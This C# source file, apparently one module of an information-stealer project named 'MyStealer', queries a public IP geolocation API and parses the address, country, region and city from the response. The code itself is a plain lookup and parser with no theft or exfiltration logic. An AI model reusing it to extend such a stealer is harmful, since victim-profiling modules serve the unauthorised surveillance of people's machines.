﻿using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collectors.Ip
{
    /// <summary>
    /// https://ip.pe.kr/api/
    /// </summary>
    internal class IpInfoAiProvider : ApiProviderBase
    {
        public override string ModuleName => "ipinfo.ai";

        public override Uri ApiUrl => new Uri("https://api.ipinfo.ai/ip/geolocation");

        public override IpDetails Parse(string response)
        {
            try
            {
                var obj = JObject.Parse(response);

                return new IpDetails
                {
                    Address = IPAddress.Parse(obj["ip"].Value<string>()),
                    CountryCode = obj["country"].Value<string>(),
                    RegionName = obj["region"].Value<string>(),
                    City = obj["city"].Value<string>()
                };
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing api response.");
                return IpDetails.Empty;
            }
        }
    }
}
